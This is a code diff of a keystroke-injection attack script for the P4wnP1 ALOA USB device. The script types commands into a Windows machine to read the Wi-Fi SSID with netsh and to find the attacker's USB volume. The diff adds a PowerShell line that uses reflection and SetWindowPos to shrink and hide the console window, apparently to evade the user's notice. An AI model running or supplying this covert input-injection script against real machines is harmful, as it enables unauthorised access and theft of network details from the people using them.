@@ -1,15 +1,13 @@
 
 layout("US"); //set US layout
 
-typingSpeed(0,0);
+typingSpeed(5,0);
 press("GUI r")
 delay(1000)
 type("cmd")
 delay(500)
 press("ENTER")
 delay(1000)
-
-press("ENTER")
 // --> Get SSID
 type("for /f \"tokens=2 delims=: \" %A in (\'netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"B\"') do set SSID=%A")
 press("ENTER")
@@ -49,6 +47,9 @@ press("LEFT")
 delay(750)
 press("ENTER")
 delay(750)
+type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
+press("ENTER");
+delay(500)
 type("cd $home\n")
 delay(500)
 type("$usbpath = Get-WMIObject Win32_Volume | ? { $_.Label -eq \'P4wnP1 ALOA\' } | select name \n")
